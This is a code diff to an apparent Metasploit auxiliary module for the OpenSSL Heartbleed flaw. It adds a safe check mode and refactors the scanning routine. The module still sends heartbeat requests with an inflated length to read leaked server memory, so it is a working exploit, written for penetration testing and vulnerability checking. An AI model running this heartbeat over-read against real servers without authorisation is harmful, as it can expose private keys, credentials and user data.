@@ -145,6 +145,10 @@ class Metasploit3 < Msf::Auxiliary
     super
   end
 
+  def max_record_length
+    1 << 14
+  end
+
   def heartbeat_length
     datastore["HEARTBEAT_LENGTH"]
   end
@@ -241,65 +245,92 @@ class Metasploit3 < Msf::Auxiliary
     res
   end
 
-  def run_host(ip)
-    connect
+  def check_host(ip)
+    heartbeat_data = test_host(ip, true)
 
-    unless datastore['STARTTLS'] == 'None'
-      vprint_status("#{peer} - Trying to start SSL via #{datastore['STARTTLS']}")
-      res = self.send(TLS_CALLBACKS[datastore['STARTTLS']])
-      if res.nil?
-        vprint_error("#{peer} - STARTTLS failed...")
+    if heartbeat_data
+      return Exploit::CheckCode::Appears
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def test_host(ip, safe = false)
+    heartbeat_data = nil
+    begin
+      connect
+
+      unless datastore['STARTTLS'] == 'None'
+        vprint_status("#{peer} - Trying to start SSL via #{datastore['STARTTLS']}")
+        res = self.send(TLS_CALLBACKS[datastore['STARTTLS']])
+        if res.nil?
+          vprint_error("#{peer} - STARTTLS failed...")
+          return
+        end
+      end
+
+      vprint_status("#{peer} - Sending Client Hello...")
+      sock.put(client_hello)
+
+      server_hello = sock.get
+      unless server_hello.unpack("C").first == HANDSHAKE_RECORD_TYPE
+        vprint_error("#{peer} - Server Hello Not Found")
         return
       end
-    end
 
-    vprint_status("#{peer} - Sending Client Hello...")
-    sock.put(client_hello)
-
-    server_hello = sock.get
-    unless server_hello.unpack("C").first == HANDSHAKE_RECORD_TYPE
-      vprint_error("#{peer} - Server Hello Not Found")
-      return
-    end
-
-    vprint_status("#{peer} - Sending Heartbeat...")
-    sock.put(heartbeat(heartbeat_length))
-    hdr = sock.get_once(5)
-    if hdr.blank?
-      vprint_error("#{peer} - No Heartbeat response...")
-      return
-    end
-
-    unpacked = hdr.unpack('Cnn')
-    type = unpacked[0]
-    version = unpacked[1] # must match the type from client_hello
-    len = unpacked[2]
-
-    # try to get the TLS error
-    if type == ALERT_RECORD_TYPE
-      res = sock.get_once(len)
-      alert_unp = res.unpack('CC')
-      alert_level = alert_unp[0]
-      alert_desc = alert_unp[1]
-      msg = "Unknown error"
-      # http://tools.ietf.org/html/rfc5246#section-7.2
-      case alert_desc
-      when 0x46
-        msg = "Protocol error. Looks like the chosen protocol is not supported."
+      vprint_status("#{peer} - Sending Heartbeat...")
+      if safe
+        sock.put(heartbeat(max_record_length - 3, safe) << heartbeat(0, safe))
+      else
+        sock.put(heartbeat(heartbeat_length))
       end
-      vprint_error("#{peer} - #{msg}")
-      disconnect
-      return
-    end
+      hdr = sock.get_once(5)
+      if hdr.blank?
+        vprint_error("#{peer} - No Heartbeat response...")
+        return
+      end
 
-    unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[datastore['TLSVERSION']]
-      vprint_error("#{peer} - Unexpected Heartbeat response")
-      disconnect
-      return
-    end
+      unpacked = hdr.unpack('Cnn')
+      type = unpacked[0]
+      version = unpacked[1] # must match the type from client_hello
+      len = unpacked[2]
 
-    vprint_status("#{peer} - Heartbeat response, checking if there is data leaked...")
-    heartbeat_data = sock.get_once(heartbeat_length) # Read the magic length...
+      # try to get the TLS error
+      if type == ALERT_RECORD_TYPE
+        res = sock.get_once(len)
+        alert_unp = res.unpack('CC')
+        alert_level = alert_unp[0]
+        alert_desc = alert_unp[1]
+        msg = "Unknown error"
+        # http://tools.ietf.org/html/rfc5246#section-7.2
+        case alert_desc
+        when 0x46
+          msg = "Protocol error. Looks like the chosen protocol is not supported."
+        end
+        vprint_error("#{peer} - #{msg}")
+        return
+      end
+
+      unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[datastore['TLSVERSION']]
+        vprint_error("#{peer} - Unexpected Heartbeat response")
+        return
+      end
+
+      vprint_status("#{peer} - Heartbeat response, checking if there is data leaked...")
+
+      length = safe ? max_record_length : heartbeat_length
+      heartbeat_data = sock.get_once(length) # Read the magic length...
+    rescue EOFError
+      vprint_error("#{peer} - EOFError")
+    ensure
+      disconnect
+    end
+    heartbeat_data
+  end
+
+  def run_host(ip)
+    heartbeat_data = test_host(ip)
+
     if heartbeat_data
       print_good("#{peer} - Heartbeat response with leak")
       report_vuln({
@@ -332,9 +363,14 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-  def heartbeat(length)
+  def heartbeat(length, safe = false)
     payload = "\x01"              # Heartbeat Message Type: Request (1)
     payload << [length].pack("n") # Payload Length: 65535
+
+    # handle safe detection
+    if safe
+      payload << Array.new(length, 1).pack("C*")  # Dummy values
+    end
 
     ssl_record(HEARTBEAT_RECORD_TYPE, payload)
   end
